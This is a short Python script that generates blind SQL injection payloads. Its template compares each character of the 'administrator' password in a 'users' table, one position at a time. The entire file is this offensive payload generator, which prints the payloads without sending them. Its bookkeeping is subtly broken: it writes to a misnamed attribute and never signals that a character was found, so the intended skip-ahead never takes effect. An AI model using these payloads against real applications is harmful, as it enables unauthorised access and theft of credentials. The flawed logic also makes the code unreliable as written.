#!/usr/bin/env python3.12
# brute_forcer.py ver 1.1
import string
import sys
from types import SimpleNamespace

from rich.console import Console

c = Console()

passwd_length = 20
payload_character_set = [letter for letter in string.ascii_letters] + [num for num in range(0, 10)]
code_to_inject = ("""
' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--
""",)
payload_tag_1 = "{char_numb}"
payload_tag_2 = "{character}"


class BruteForcer:
    def __init__(self, password_length, payload_char_set, inject_code):
        self.characters_seq_numbers = None
        self.password_length = int(password_length)
        self.character_seq_numbers = [numb for numb in range(1, self.password_length + 1)]
        self.payload_char_set = payload_char_set
        self.inject_code = inject_code
        self.payload_kit = None
        self.char_found = False

    def brute_force(self):
        for char_seq_number in self.character_seq_numbers:
            for char in self.payload_char_set:
                code = self.inject_code.replace(payload_tag_1, str(char_seq_number)).replace(payload_tag_2, str(char))
                if self.char_found is False:
                    self.payload_kit = SimpleNamespace(inject_code=code, sequence_num=char_seq_number, character=char)
                    yield self.payload_kit
                else:
                    new_character_seq_numbers = [numb for numb in range(char_seq_number + 1, self.password_length + 1)]
                    self.characters_seq_numbers = new_character_seq_numbers
                    self.check_response(False)
                    break

    def check_response(self, char_found):
        self.char_found = char_found


def main():
    bf = BruteForcer(passwd_length, payload_character_set, code_to_inject[0])
    code_gen = bf.brute_force()
    while True:
        try:
            payload_kit = next(code_gen)
            c.print(payload_kit)
        except StopIteration:
            c.log("All combinations processed.", style="green")
            sys.exit(0)


if __name__ == "__main__":
    main()
